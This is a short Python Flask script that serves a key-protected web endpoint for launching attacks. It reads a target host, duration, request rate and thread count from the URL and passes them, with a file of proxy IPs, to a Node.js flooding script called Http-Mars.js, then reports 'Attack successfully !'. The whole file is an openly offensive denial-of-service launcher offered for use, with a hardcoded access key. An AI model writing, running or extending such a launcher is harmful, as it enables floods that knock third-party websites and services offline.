from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/run-script')
def run_script():
    # Check if the provided key is valid
    key = request.args.get('key')
    if key != 'bvp2007':  # Replace YOUR_API_KEY with your own key
        return 'Invalid key!'

    # Get the values of host, time, rate, and thread from the passed parameters
    host = request.args.get('host')
    time = request.args.get('time')
    rate = request.args.get('rate')
    thread = request.args.get('thread')

    # Check if the ip.txt file exists
    ip_filepath = '/sdcard/Download/ip.txt'
  # Replace path/to/your/ip.txt with the path to your ip.txt file
    try:
        with open(ip_filepath, 'r') as file:
            # Run the script with the obtained parameters
            subprocess.call(['node', '/sdcard/Download/Http-Mars.js', host, time, rate, thread, ip_filepath])
        return 'Attack successfully !'
    except Exception as e:
        return f'Error ! '

if __name__ == '__main__':
    app.run(port=9999)
